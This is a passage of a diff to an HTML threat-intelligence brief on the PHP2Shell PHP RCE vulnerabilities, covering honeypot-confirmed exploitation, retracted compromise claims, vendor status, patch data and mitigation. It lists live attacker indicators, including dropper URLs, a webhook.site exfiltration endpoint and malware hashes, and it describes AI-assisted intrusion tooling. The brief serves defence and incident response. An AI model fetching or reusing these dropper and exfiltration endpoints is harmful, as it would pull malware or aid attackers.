@@ -200,6 +200,7 @@
   }
   .callout.crit { border-left-color: var(--crit); }
   .callout.info { border-left-color: var(--info); }
+  .callout.ok { border-left-color: var(--ok); }
   .callout p:last-child { margin-bottom: 0; }
   .callout .label {
     font-family: var(--font-mono); font-size: 10.5px; letter-spacing: .1em;
@@ -403,7 +404,7 @@
     <div class="meta-row">
       <span class="chip chip-crit">Critical · exploited</span>
       <span class="chip chip-mute">TLP:CLEAR</span>
-      <span>Compiled 21 Oct 03:55 · revised 23 Oct: Sophos correction, Potassium payload, per-IOC review</span>
+      <span>Compiled 21 Oct 03:55 · revised 26 Oct: confirmed exploitation, Unit 42 retraction, CVE-2026-115560, PAN-OS correction, patch adoption, social layer</span>
       <span>Patched 13:44 UTC · exploited in the wild at scale</span>
     </div>
     <h1>PHP2Shell: <span class="nw">CVE-2026-109618</span> &amp; <span class="nw">CVE-2026-109619</span></h1>
@@ -413,16 +414,171 @@
   <div class="bluf">
     <h2>Bottom line</h2>
     <ol>
-      <li><strong>It is being exploited, at scale, right now.</strong> Hadrian: <em>&ldquo;We are now seeing php2shell exploited in the wild at scale&rdquo;</em>, and &ldquo;<em>most of the attacks we observe abuse PHP&rsquo;s session upload-progress path</em>&rdquo;. Cloudflare, Patchstack, Vega and watchTowr all reported attempts within hours of the patch. <strong>No successful in-the-wild compromise has been confirmed</strong> &mdash; watchTowr: &ldquo;nobody has been successful to date&rdquo;. Exploitation at scale and confirmed compromise are different claims; only the first is evidenced. <strong>On 22 October Sophos made the one compromise claim in this case and retracted it five hours later</strong> &mdash; see the 23 October update above.</li>
+      <li><strong>The exploit now works in the wild, and we have the packets.</strong> A honeypot operator published, on 24 October, <strong>35 complete execution-stage POSTs each followed within 400&nbsp;ms by a <code>/bin/sh</code> whose parent is <code>apache2</code> running as <code>uid=33</code></strong> &mdash; matched across target-side PCAP and kernel process events, from two source addresses, against three targets. That is the first direct evidence in this case that public-tooling-class exploitation reaches a shell. It is <em>not</em> a victim compromise: the targets were disposable honeypots deliberately built in the configuration the exploit needs. See the 26 October update.</li>
+      <li><strong>It is being exploited, at scale, right now.</strong> Hadrian: <em>&ldquo;We are now seeing php2shell exploited in the wild at scale&rdquo;</em>, and &ldquo;<em>most of the attacks we observe abuse PHP&rsquo;s session upload-progress path</em>&rdquo;. Cloudflare, Patchstack, Vega and watchTowr all reported attempts within hours of the patch. <strong>No successful in-the-wild <em>victim</em> compromise has been confirmed.</strong> Both compromise claims made in this case have been retracted &mdash; Sophos on 22 October, five hours after making it, and Unit&nbsp;42 on 25 October. Exploitation at scale, successful exploitation and victim compromise are three different claims; the first two are now evidenced, the third is not. See the 23 and 26 October updates.</li>
       <li><strong>FPM is in scope, and the advisory text understated it.</strong> The GitHub advisory left PHP-FPM at &ldquo;considered susceptible by source analysis&rdquo;. The PHP security team&rsquo;s own <a href="https://www.openwall.com/lists/oss-security/2026/10/21/16">oss-security post</a> is stronger: <em>&ldquo;Unauthenticated RCE has been demonstrated against Apache mod_php and PHP-FPM.&rdquo;</em> If your estate is FPM-only, you are not in a second tier.</li>
       <li><strong>The mechanism is now properly documented &mdash; four bugs under two CVEs.</strong> <a href="https://www.wiz.io/blog/php2shell-php-rce">Wiz Research</a> describes 109618 as an upload-progress unserializer use-after-free plus a process-memory disclosure, and 109619 as a fatal-error backtrace use-after-free plus an OPcache type confusion. Every one is a <em>state-survives-a-bailout</em> bug: memory is freed out from under a global pointer, and the next request on the same worker uses it.</li>
       <li><strong>The session path the ecosystem built rules for is the one attackers are actually using</strong> &mdash; not because the leaked PoC was right about the root cause, but because <code>session.upload_progress</code> is the cheapest way to reach it. That partly reprieves the WAF rules deployed on 21 October, but only for 109619. Nothing in that rule set touches 109618.</li>
-      <li><strong>An unconfirmed claim that the 8.5.12 fix is incomplete.</strong> A Fediverse post says the exploit &ldquo;still works on 8.5.12&rdquo;. Canonical reportedly asked php.org and was told it is &ldquo;unrelated and not a real issue&rdquo;. PHP has not answered publicly and no reproducer has been published. <span class="chip chip-crit">Unresolved</span> &mdash; do not act on it, but do not close the incident on patching alone either.</li>
+      <li><strong>An unconfirmed claim that the 8.5.12 fix is incomplete.</strong> A Fediverse post says the exploit &ldquo;still works on 8.5.12&rdquo;. Canonical reportedly asked php.org and was told it is &ldquo;unrelated and not a real issue&rdquo;. PHP has not answered publicly and no reproducer has been published. The nearest independent test since &mdash; <a href="https://www.covertswarm.com/post/php2shell-moving-beyond-a-lab-proof-of-concept-to-code-execution-with-aslr-enabled">CovertSwarm&rsquo;s AArch64 work</a> &mdash; got execution on 8.5.11 and <strong>no execution on 8.5.12 controls</strong>, which cuts against the claim without testing its specific reproducer. <span class="chip chip-crit">Unresolved</span> &mdash; do not act on it, but do not close the incident on patching alone either.</li>
       <li><strong>Discovery credit belongs to Wiz Research</strong>, not to the leaker: first bug found 19 August with AI assistance, reported 24 August, acknowledged 21 September, coordinated with PHP, Calif and OpenAI. This replaces the &ldquo;the leak was the finder&rdquo; reading this brief carried yesterday.</li>
       <li><strong>There are IOCs &mdash; and this brief was wrong to say there were none.</strong> Earlier revisions queried ThreatFox, OTX and URLhaus and saw zero; those feeds index malicious infrastructure, not attacking hosts seen by canaries. <a href="https://www.vulncheck.com/blog/php2shell-vulnerabilities">VulnCheck</a> published five addresses, four user-agents, a session ID, a multipart boundary and four SHA-256s; <a href="https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/">AWS MadPot</a> published six more, including an exploitation attempt on <strong>17 October, four days before disclosure</strong>. The indicator that matters most: <code>221.14.159.134</code> &mdash; the one host that actually tried to exploit &mdash; carries no reputation at all, on any instrument.</li>
-      <li><strong>Not in CISA KEV</strong> &mdash; catalog <code>2026.10.21</code>, 1,754 entries, both CVEs absent, re-checked 02:00 UTC. MITRE and NVD both carry the records.</li>
+      <li><strong>Still not in CISA KEV</strong> &mdash; catalog <code>2026.10.23</code>, <strong>1,756</strong> entries, both CVEs absent, fetched directly 26 October. NVD has since moved both records to <em>Analyzed</em> and added CVSS&nbsp;v3.1 scores (9.8 and 8.1) alongside the 9.2 v4.0.</li>
+      <li><strong>Patching does not fix everything.</strong> A third PHP RCE, <strong>CVE-2026-115560</strong>, was disclosed in an informational advisory on 23 October and is <em>not</em> fixed by the 21 October releases; PHP is holding it for the regular cycle. It needs a narrow and unusual configuration, has no NVD record and no exploitation, and the same <code>session.upload_progress.enabled=0</code> setting covers it &mdash; which is the strongest argument yet for leaving that mitigation in place after patching.</li>
     </ol>
   </div>
+
+  <section id="update-26">
+    <p class="eyebrow">Update &middot; 26 October</p>
+    <h2>Exploitation succeeded &mdash; on a host configured the way the exploit needs</h2>
+    <p>Three things moved since the 23 October revision. The first is what this case has been waiting for since 17 October: a capture of the exploit actually working, with the packets and the process tree to prove it. The second is a second retracted compromise claim. The third corrects this brief &mdash; the PAN-OS item it recorded on 23 October as <em>unverified</em> turns out to be true.</p>
+
+    <div class="callout crit">
+      <span class="label">First end-to-end confirmation &mdash; 35 shells, 35 request bodies, three targets</span>
+      <p>On <strong>24 October</strong>, the <strong>phpot</strong> honeypot project (<code>0x4D31</code>) published <a href="https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md">&ldquo;PHP2Shell exploitation observed: packet-to-process RCE evidence&rdquo;</a>. Across six sensors and three disposable targets, it correlates <strong>35 complete execution-stage HTTP POSTs with 35 <code>/bin/sh</code> starts whose recorded parent is <code>apache2</code>, <code>uid=33</code></strong>. The join is by source port, request sequence and worker PID &mdash; not by an alert label or an HTTP status.</p>
+      <p><strong>Two source-address episodes:</strong> <code>15.204.59.70</code> (OVH US, <code>vps-b225fb62.vps.ovh.us</code>) produced 3 shells on one target between 15:35 and 16:04 UTC; <code>162.35.99.94</code> (Interserver, <code>vps3749638.trouble-free.net</code>) produced 32 across all three between 16:46 and 18:57. Four further addresses sent exploit-shaped traffic with crashes but no shell and no disclosure-sized cookie &mdash; <code>104.28.208.84</code>, <code>144.48.4.242</code>, and in the earlier window <code>178.249.214.6</code> and <code>89.167.27.27</code>. Those are attempt indicators, not execution.</p>
+      <p><strong>The chain is the published one, not a new primitive.</strong> Four stages: memory pressure (OOM in <code>Unknown on line 0</code>), an <strong>819,200-byte <code>PHPSESSID</code> response cookie</strong> carrying pointer-like words, further memory pressure, then a target-adjusted execution body. 51 of 52 disclosure cookies were reconstructed from packet capture and acknowledged by the client &mdash; so the leak demonstrably arrived, rather than being assumed. The dominant leaked pointer differed on each target and the execution body tracked it by a constant offset, which is what leak-guided ASLR defeat looks like.</p>
+    </div>
+
+    <h3>Why this is exploitation, and still not a victim compromise</h3>
+    <p>The distinction is not pedantry, because the reports differ in kind. Sophos and Unit&nbsp;42 both spoke about <em>victims</em> and both withdrew. This is a controlled experiment in which the attacker won, and the evidence is of a higher grade than either: raw packets plus kernel process events, published with hashes so it can be re-examined.</p>
+    <p>But look at the target: <strong>single-worker Apache <code>mod_php</code>, PHP 8.4.26, 128&nbsp;MiB <code>memory_limit</code>, plaintext HTTP/80</strong>. That is close to the exact precondition list independent analysts gave for a reliable exploit. Iron Castle&rsquo;s analysis named a low <code>memory_limit</code>, single-worker prefork, and known <code>zval_ptr_dtor</code>/<code>zif_system</code> offsets; the honeypot had all three. A Fediverse commenter made the same point within hours of publication &mdash; the write-up <em>&ldquo;ran in a single-worker setup, which would be very unusual for a real deployment&rdquo;</em> &mdash; and was right.</p>
+    <div class="callout info">
+      <span class="label">This resolves the four-day puzzle</span>
+      <p>&ldquo;Exploited at scale, nobody succeeding&rdquo; never made sense as a description of a working exploit. The reconciliation is configuration, not luck: <strong>the exploit succeeds where the target has one worker and a tight memory limit, and fails nearly everywhere else</strong> because the OOM stage must actually fire and the stale state must survive on the <em>same</em> worker for the next request. Default <code>php-fpm</code> pools with several children and 128&ndash;512&nbsp;MiB spread requests across workers and raise the ceiling. Hunt.io&rsquo;s sample makes the same point from the other side: 123 targets probed, ~57 running PHP, <strong>none exploited</strong>. Sansec&rsquo;s walk-back says it outright &mdash; public exploits fail against default installations.</p>
+      <p>Operationally this inverts the usual prioritisation. Patch everything, but when you triage for <em>likelihood of actual compromise</em>, look first for the pathological cases: single-worker or <code>pm.max_requests=1</code> pools, low <code>memory_limit</code>, and the <code>session.upload_progress</code> defaults left on. Those are the hosts that match the successful capture.</p>
+    </div>
+
+    <h3>Unit&nbsp;42 retracted the second compromise claim &mdash; and the press ran it first</h3>
+    <div class="callout crit">
+      <span class="label">Correction &mdash; the European government intrusion is real; the PHP2Shell link is not established</span>
+      <p>Unit&nbsp;42&rsquo;s 23 October update described an intrusion at a <strong>European government agency</strong>: password hashes and MFA secrets read from an application database within roughly two hours, an <strong>NTLM-relay tunnel into Active Directory</strong>, and an <em>attempted</em> Domain Admin escalation. It read the command traffic as agentic-AI tooling, on the basis of machine-parseable batches wrapped in delimiters such as <code>==SHELLUSER==</code> and <code>==PASSWD==</code>.</p>
+      <p>On <strong>25 October</strong> it withdrew the causal claim: <em>&ldquo;We are unable to confirm that initial access is associated with the specific PHP2Shell CVEs&rdquo;</em>, and <em>&ldquo;We have retracted our previous update from October 23.&rdquo;</em> The intrusion is not retracted &mdash; the attribution of its entry point is.</p>
+      <p><strong>The sequencing matters for anyone reading news rather than advisories.</strong> The Hacker News article built on the retracted update (&ldquo;PHP2Shell Exploitation Hits Government Entity&hellip;&rdquo;) was published at 18:42 UTC on 25 October; Unit&nbsp;42&rsquo;s retraction is timestamped 14:15 PT, about 21:15 UTC. Several aggregators and social posts were still carrying the un-retracted version the following morning. <strong>Cite the advisory, not the article about it.</strong></p>
+    </div>
+    <p>That is now <strong>two claims raised and two withdrawn in this case</strong> &mdash; a pattern worth naming, because it is not random. Both came from telemetry that showed post-exploitation-looking activity near a vulnerable application, and in both cases the missing link was the same: nobody could show which request did it. The honeypot work above is the only publication in this case that closes that gap, and it does so by instrumenting the target rather than the victim.</p>
+
+    <h3>Correction: PAN-OS is affected</h3>
+    <div class="callout crit">
+      <span class="label">This brief called it unverified on 23 October. It is true.</span>
+      <p><a href="https://security.paloaltonetworks.com/CVE-2026-109618">Palo Alto Networks advisory 047910</a>, published 21 October and updated 25 October, confirms that <strong>PAN-OS and Panorama are affected</strong> &mdash; PA-Series and VM-Series firewalls and Panorama (virtual and M-Series) &mdash; <strong>strictly through the management web interface</strong>, meaning the HTTPS UI and the XML API. A dataplane interface is in scope only where a management profile is attached to it. No special configuration is required beyond reachability.</p>
+      <p>The circulating claim this brief declined to carry on 23 October was therefore <strong>right about the impact and roughly right about the dates</strong>. It was still correct to withhold it at the time: the 23 October version named no vendor advisory and added a 26&ndash;30 October hotfix window that then shifted per branch. The lesson is not &ldquo;believe rumours&rdquo; but the narrower one this project already carries &mdash; <em>a claim is unverified until a primary source exists, and then it is verified, not vindicated</em>.</p>
+      <p>Hotfixes <code>10.2.18-h13</code>, <code>11.1.16-h4</code> and <code>11.2.10-h16</code> shipped on 25 October; the remaining branches are estimated 27&ndash;30 October and <strong>Panorama has no published ETA</strong>. Palo Alto states it is not aware of exploitation against its products, and lists exploit maturity as <code>N/A</code>.</p>
+      <p><strong>Read the score, not the number.</strong> Palo Alto rates this <strong>8.7 High with vector <code>VC:N/VI:N/VA:H</code></strong> &mdash; availability only &mdash; against PHP&rsquo;s 9.2 with confidentiality and integrity high. Same bug, different product consequence: on PAN-OS the management plane can be crashed and coerced, which is severe, but the vendor is not claiming code execution in its own context. Plan the patch from that, and do not assume a PAN-OS 8.7 and a PHP 9.2 are the same emergency.</p>
+    </div>
+
+    <h3>A third bug, and it will not be patched in a hurry &mdash; CVE-2026-115560</h3>
+    <p>PHP published an <strong>informational advisory on 23 October</strong> for a third remote-code-execution path in the same feature area. The conditions are narrow and cumulative: an application must set <code>session.serialize_handler</code> to <code>php_binary</code> or <code>php_serialize</code> in configuration, then <strong>switch it to <code>php</code> at runtime with <code>ini_set()</code> before <code>session_start()</code></strong>, with <code>session.upload_progress</code> still enabled. The underlying hazard is old &mdash; PHP bug #71101 (2015), which warns that the serialize handler must not be switched for existing sessions.</p>
+    <p>PHP Foundation executive director Elizabeth Barron: the flaw <em>&ldquo;requires a very unlikely combination of configuration and specific PHP application code&rdquo;</em> and <em>&ldquo;we do not expect to occur in practical use of PHP&rdquo;</em>. It is being held for the regular release cycle rather than an emergency fix, and will get a full advisory with the next bugfix release. <strong>Verified 26 October: no NVD record exists, and no PHP release has shipped since 21 October</strong> &mdash; 8.5.12, 8.4.27, 8.3.36 and 8.2.35 remain the newest on every branch. No exploitation reported.</p>
+    <p>The practical consequence is one line: <strong>do not remove <code>session.upload_progress.enabled=0</code> after patching.</strong> It is the entire published mitigation for 115560, and Rapid7&rsquo;s ordering rule still applies &mdash; it must be set before request parsing, in <code>php.ini</code>, the FPM pool or the server config, and every worker restarted. <code>ini_set()</code> and <code>.user.ini</code> remain too late.</p>
+
+    <h3>The estate is much larger than the PHP packages you manage</h3>
+    <p>The reason appliances mattered is now confirmed rather than conjectured. Downstream vendors with their own embedded PHP runtimes have published status, and the list is not short:</p>
+    <div class="scroll">
+      <table>
+        <thead><tr><th>Vendor</th><th>Status</th><th>Detail worth knowing</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Palo Alto Networks</strong></td><td>Partial &mdash; hotfixes shipping 25&ndash;30 Oct</td><td>PAN-OS / Panorama management web UI. 8.7, availability-only. Cortex XCORE and WildFire Cloud patched 21&ndash;22 Oct.</td></tr>
+          <tr><td><strong>Oracle</strong></td><td>Partial &mdash; alert 25 Oct</td><td>Patches for listed Oracle products and Solaris 11; alert updated as more ship.</td></tr>
+          <tr><td><strong>QNAP</strong></td><td>Partial &mdash; firmware 24 Oct</td><td>QTS, QuTS hero, QuTScloud, QuMagie, Note Station 3, QNE, QVR. <strong>EOL Download Station and the PHP extensions app will never be fixed &mdash; uninstall.</strong></td></tr>
+          <tr><td><strong>Citrix</strong></td><td>Vulnerable, fix pending</td><td>NetScaler ADC and Gateway management GUI only (NSIP GUI, management-enabled SNIPs, cluster IP GUI). Restrict management access meanwhile. Console and SVM unaffected.</td></tr>
+          <tr><td><strong>F5</strong></td><td>Vulnerable, fix pending</td><td>BIG-IP 17.1.0&ndash;17.1.3, 17.5.0&ndash;17.5.1, 21.1.0 &mdash; configuration utility and APM page templates.</td></tr>
+          <tr><td><strong>Cisco</strong></td><td>Mostly not vulnerable</td><td>Only Ultra-Reliable Wireless Backhaul (fix 27.1.1, Feb 2027, admin-auth required) and Expressway (fix 15.5.21, undated). ISE, SD-WAN Manager, Meraki, Umbrella, Webex, IOS-XE/XR, NX-OS, Secure Firewall, UCS confirmed not vulnerable.</td></tr>
+          <tr><td><strong>Check Point / Synology / Okta / Peplink / LiteSpeed</strong></td><td>Fixed or partial</td><td>sk1000302; DSM 7.2&ndash;7.4 PHP packages (7.3 no fix); OAG 2026.44.0; ICVA 2.14.4 and Edge 8.6.1s042; 6.3.7 build 5/6 bundled <code>admin_php</code>.</td></tr>
+          <tr><td><strong>Linux distributions</strong></td><td>Fixed</td><td>Debian, Fedora, Gentoo, Ubuntu, Red Hat (RHSA-2026:87151), Slackware, SUSE; <code>deb.sury.org</code> backports down to 5.6.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p><strong>Scale of the tracking problem:</strong> NCSC-NL maintains a machine-readable product list &mdash; <a href="https://github.com/NCSC-NL/php2shell">github.com/NCSC-NL/php2shell</a>, TLP:CLEAR, with SPDX sources &mdash; reporting roughly <strong>750 products</strong> as of 23 October: about 109 fixed, 220 vulnerable, 389 under investigation and 30 not affected. That is the practical answer to &ldquo;how do I know if I run PHP?&rdquo;: assume you do, then go and check the appliances. Rapid7&rsquo;s Velociraptor artifact <code>Generic.Applications.PHPInventory</code> covers the hosts; these advisories cover the boxes you cannot log into.</p>
+
+    <h3>Did anyone actually patch? Two measurements</h3>
+    <p>For once there is adoption data rather than anecdote.</p>
+    <ul>
+      <li><strong><a href="https://vu.co.uk/blog/who-has-patched-php">Vu Agency scanned ~1M sites</a></strong> (22&ndash;23 October) that had previously advertised a pre-fix PHP version. Of 824,947 that still returned a version: <strong>24% showed a fixed release</strong>, and a further <strong>23% were on Hostinger and judged likely patched</strong> because Hostinger applied the fix without changing the version string. Roughly half showed an older number whose patch state cannot be determined externally &mdash; because <strong>CloudLinux and Plesk backports keep the old version number</strong>. 139,706 returned nothing.</li>
+      <li><strong>Qualys</strong>, across anonymised data from 12,000 customers, counted <strong>199,000 PHP instances patched within 12 hours</strong> of disclosure &mdash; against roughly <strong>110 million instances (71%) on end-of-life PHP 5.4&ndash;8.1</strong> that will never receive a vendor fix, plus another 44 million on supported branches with a patch available and unapplied.</li>
+    </ul>
+    <p><strong>Treat external patch measurement as a floor, not a census.</strong> Version strings are the wrong instrument for backported fixes in both directions: it under-counts patched CloudLinux and Hostinger hosts and over-counts nothing. The 24% figure is a lower bound on a sample that was already known to be exposed.</p>
+
+    <h3>What the practitioner conversation is saying &mdash; social media, read 26 October</h3>
+    <p>Collected because press coverage and social coverage diverged sharply on this incident. Reachability is stated per source, because a blocked page and an empty page both return <code>200</code>:</p>
+    <div class="scroll">
+      <table>
+        <thead><tr><th>Source</th><th>State</th><th>What it contributed</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Mastodon</strong> &mdash; <code>#php2shell</code> tag timeline via the Status API</td><td><span class="chip chip-ok">Read</span> &mdash; 30 statuses, 25&ndash;26 Oct</td><td>The most useful channel. Practitioner critique of the honeypot write-up, scepticism of the AI narrative, vendor-alert relaying, and the weekly CVE round-up.</td></tr>
+          <tr><td><strong>Hacker News</strong> &mdash; Algolia API</td><td><span class="chip chip-ok">Read</span></td><td>Surfaced the honeypot report, The Register&rsquo;s third-bug piece, and the Politico and 404 Media features before search indexes caught up.</td></tr>
+          <tr><td><strong>Bluesky</strong></td><td><span class="chip chip-mute">Not usable</span></td><td>Direct search API returned <code>403</code>. Bluesky posts are nonetheless visible through <code>bsky.brid.gy</code> bridge accounts that mirror them onto Mastodon &mdash; that is how the <code>#PHP2Shell</code> posts above were read. Completeness of the bridge is <em>Unknown</em>.</td></tr>
+          <tr><td><strong>X / Twitter</strong></td><td><span class="chip chip-mute">Not usable</span></td><td>Login-walled; mirror fetches return a Cloudflare challenge, not post text. Only the search index reaches it. <strong>&ldquo;Not seen on X&rdquo; is a statement about an index, never about the platform.</strong></td></tr>
+          <tr><td><strong>Reddit</strong></td><td><span class="chip chip-mute">Not usable</span></td><td><code>403</code> interstitial. Not read this run.</td></tr>
+          <tr><td><strong>Telegram</strong></td><td><span class="chip chip-mute">Unexecuted</span></td><td>No channel identified for this topic; not queried, therefore not a negative.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p><strong>Four themes, and one that should be discarded:</strong></p>
+    <ol>
+      <li><strong>The AI-exploit narrative is being pushed back on by practitioners, not amplified.</strong> The dominant security-community framing is that AI assistance shortened discovery and analysis but did not hand anyone an exploit. <em>&ldquo;Anyone claiming &lsquo;AI removed the cost&rsquo; for the binary analysis and exploitation of PHP2Shell doesn&rsquo;t know ball&rdquo;</em> is representative; a German-language thread makes the same argument at length. This sits directly against the 404 Media and Politico angles (&ldquo;AI Is Changing Everything About Hacking&rdquo;), and it is corroborated by the technical record: Sophos found building a working exploit hard <em>even with AI support</em>, and the successful chain above still needed hand-tuned offsets and a favourable target.</li>
+      <li><strong>The honeypot write-up was met with immediate, correct methodological criticism</strong> &mdash; the single-worker, tight-memory configuration is not a normal production target. That criticism does not weaken the finding; it <em>explains</em> the gap between &ldquo;exploited at scale&rdquo; and &ldquo;no compromises&rdquo;, which is the single most useful analytical result of the week. Read the two together.</li>
+      <li><strong>Retraction lag is a live misinformation mechanism.</strong> The Unit&nbsp;42 intrusion story propagated for roughly twelve hours before the correction, and social posts carrying the un-retracted version were still circulating a day later. The same happened on a smaller scale with Sophos on 22 October. On this incident, <strong>advisories moved faster than the conversation about them</strong>.</li>
+      <li><strong>Collateral effects are showing up outside security reporting.</strong> A game project, SuperTuxKart, took its servers offline and is rebuilding in Python; the Internet Archive, Orange, ANA, Swiss host Cyon (&gt;100,000 sites) and 32 UK government services took precautionary action. This is the &ldquo;hundreds of websites&rdquo; claim from 21 October, now with named examples.</li>
+    </ol>
+    <div class="callout crit">
+      <span class="label">Discard: the &ldquo;Lazarus Group&rdquo; attribution</span>
+      <p>A post circulating on 25&ndash;26 October claims <strong>&ldquo;Lazarus Group Targets PHP2Shell Flaw in Global Campaign&rdquo;</strong>, combining the retracted European-government intrusion with a DPRK attribution. <strong>No primary source supports it.</strong> Unit&nbsp;42 explicitly declines to name the actor, the victim or the AI platform, and none of the seven write-ups of that intrusion reviewed here mention Lazarus or any DPRK cluster. The post&rsquo;s other details are recycled from the retracted update. <span class="chip chip-crit">Unconfirmed &mdash; do not carry</span>. This case&rsquo;s standing position remains correct: <strong>unattributed, opportunistic, commodity</strong>.</p>
+    </div>
+
+    <h3>New indicators, from telescope and honeypot telemetry</h3>
+    <p>These are published here for hunting and retro-matching. <strong>They have not been enriched or given per-entity verdicts</strong>, unlike the 23 October set in the indicators section, and the CSV export has not been regenerated to include them &mdash; treat them as leads, not blocklist rows. The most valuable of them corroborate each other across independent sensors rather than adding new addresses.</p>
+    <div class="scroll">
+      <table class="adv">
+        <thead><tr><th>Indicator</th><th>Type</th><th>Role</th><th>Source</th></tr></thead>
+        <tbody>
+          <tr><td><code>15.204.59.70</code></td><td>IP</td><td><strong>Confirmed shell</strong>, 3&times;, 24 Oct 15:35&ndash;16:04 UTC. OVH US, PTR <code>vps-b225fb62.vps.ovh.us</code></td><td>phpot honeypot</td></tr>
+          <tr><td><code>162.35.99.94</code></td><td>IP</td><td><strong>Confirmed shells</strong>, 32&times;, 24 Oct 16:46&ndash;18:57 UTC. Interserver, PTR <code>vps3749638.trouble-free.net</code></td><td>phpot honeypot</td></tr>
+          <tr><td><code>104.28.208.84</code><br><code>144.48.4.242</code></td><td>IP</td><td>Exploit-shaped requests, worker crashes, <strong>no shell</strong> &mdash; attempt indicators only</td><td>phpot honeypot</td></tr>
+          <tr><td><code>45.74.7.227</code></td><td>IP</td><td>Dropper collector: <code>/collect/p2srun.php?w=p2s&lt;sensor&gt;</code> with <code>stage=diag</code> variants; 159+76+83 requests, 16 source IPs</td><td>Delft TI telescope</td></tr>
+          <tr><td><code>217.60.102.5</code></td><td>IP</td><td>Dropper host <code>https://217.60.102.5/sh</code> &mdash; <strong>3,561 requests from 4 source IPs</strong>, the busiest single payload URL observed</td><td>Delft TI telescope</td></tr>
+          <tr><td><code>176.65.139.153</code></td><td>IP</td><td>Dropper <code>/wget.sh</code></td><td>Delft TI telescope</td></tr>
+          <tr><td><code>217.15.162.38:27182</code><br><code>87.251.64.204:7716</code><br><code>185.225.191.232</code><br><code>45.115.26.26:8000</code></td><td>IP:port</td><td>Single-source droppers &mdash; <code>/srl.sh</code>, <code>/issue</code>, <code>/i</code>, <code>/c</code>, <code>/cCmono</code>, <code>/cClar</code></td><td>Delft TI telescope</td></tr>
+          <tr><td><code>92.118.112.100</code></td><td>IP</td><td><code>/nfs</code> and <code>/s</code>. <strong>Cross-sensor confirmation</strong> &mdash; the same <code>/nfs</code> host Sophos published on 22 October</td><td>Delft TI + Sophos</td></tr>
+          <tr><td><code>hana.by</code></td><td>Domain</td><td>Dropper host in the same set</td><td>Delft TI telescope</td></tr>
+          <tr><td><code>pastebin.com/raw/wCYGVCBG</code></td><td>URL</td><td>Second-stage retrieval via Pastebin; 71 requests. Expect rotation</td><td>Delft TI telescope</td></tr>
+          <tr><td><code>webhook.site/c8370342-2a5c-489c-a0d3-35930cc2bc54</code></td><td>URL</td><td>Exfiltration/beacon endpoints (8 distinct paths, 2 requests each) &mdash; free service, no attribution value</td><td>Delft TI telescope</td></tr>
+          <tr><td>SHA-256 <code>0c5486f0&hellip;d1486</code></td><td>Hash</td><td>Potassium <code>nfs</code>, Mirai-derived DDoS bot &mdash; <strong>matches the Sophos sample independently</strong></td><td>Delft TI + Sophos</td></tr>
+          <tr><td>SHA-256 <code>7d9965de&hellip;f100a9</code></td><td>Hash</td><td>Mirai variant <code>2.0.4_socks5</code>; fallback C2 accepted the bot without issuing a command</td><td>Delft TI telescope</td></tr>
+          <tr><td>SHA-256 <code>a5289abe&hellip;95fc3af</code></td><td>Hash</td><td><strong>Nim implant <code>crong3-agent</code> 3.0.0-929</strong>, masquerading as <code>sysmon</code>, persistent; C2 discovery via Ethereum ENS and a Solana account, avoiding ordinary DNS. <em>Qualitatively different from the Mirai payloads &mdash; this is not a DDoS bot.</em></td><td>Delft TI telescope</td></tr>
+          <tr><td>SHA-256 <code>f0aa83bb&hellip;6c18d987</code></td><td>Hash</td><td>Unknown sample; DNS-over-TLS, one encrypted message to a non-responding server</td><td>Delft TI telescope</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p><strong>Two request-body digests for retro-matching</strong>, computed over the <em>decoded</em> multipart body rather than the wire bytes. The first three stages were byte-identical across both source clusters and all three targets, which is what makes them useful:</p>
+    <div class="code">
+      <button type="button" data-copy>Copy</button>
+      <pre><code>8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6  A1  memory pressure, 1,060,211 B
+b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2  B1  disclosure,     33,128,677 B
+7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236  A2  memory pressure,    279,369 B</code></pre>
+      <div class="code-cap">B2 varies with the target&rsquo;s leaked address range &mdash; deliberately, and that is the exploit working as designed</div>
+    </div>
+    <p><strong>The telescope census, for scale:</strong> Delft Threat Intelligence Lab reports <strong>40,848 exploitation requests from 561 source IPs across 263 ASNs in 67 countries</strong> between 21 October 08:37 and 26 October 01:35 UTC, peaking at 2,116 requests in the hour of 21 October 21:00, with <strong>168 source IPs having delivered code or a dropper URL</strong>. Two IPs account for 49 requests <em>before</em> the fixed releases shipped &mdash; an independent second sighting of the pre-disclosure activity AWS reported. CrowdSec, counting differently, has 513 IPs, escalated to &ldquo;Rapid Escalation&rdquo; on 23 October and now describes volume as <em>&ldquo;significantly declined&rdquo;</em> and below the long-term average. Both are consistent: a sharp spike that decayed once patching caught up.</p>
+
+    <h3>Status, checked 26 October</h3>
+    <div class="scroll">
+      <table>
+        <thead><tr><th>Question</th><th>Answer</th><th>Basis</th></tr></thead>
+        <tbody>
+          <tr><td>In CISA KEV?</td><td><strong>No</strong></td><td>Catalog <code>2026.10.23</code>, <strong>1,756</strong> entries, both CVEs absent &mdash; fetched directly 26 Oct</td></tr>
+          <tr><td>New PHP release since the fix?</td><td><strong>No</strong></td><td>Release API: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, all 21 Oct, still newest on every branch</td></tr>
+          <tr><td>NVD status</td><td><strong>Analyzed</strong></td><td>Both CVEs, modified 23 Oct; v4.0 9.2 plus v3.1 <strong>9.8</strong> (618) and <strong>8.1</strong> (619)</td></tr>
+          <tr><td>CVE-2026-115560 record</td><td><strong>None</strong></td><td>NVD returns no record; php.net informational advisory only</td></tr>
+          <tr><td>Successful exploitation</td><td><strong>Confirmed</strong></td><td>35 Apache-parent shells with PCAP + Tetragon correlation, 24 Oct &mdash; against honeypots</td></tr>
+          <tr><td>Confirmed victim compromise</td><td><strong>No</strong></td><td>Two claims withdrawn (Sophos 22 Oct, Unit&nbsp;42 25 Oct); every other sensor reports attempts only</td></tr>
+          <tr><td>Reproduction</td><td><strong>Confirmed</strong></td><td>watchTowr now states it reproduced <em>both</em> CVEs &mdash; upgrading this brief&rsquo;s earlier MEDIUM, media-relayed grading to primary</td></tr>
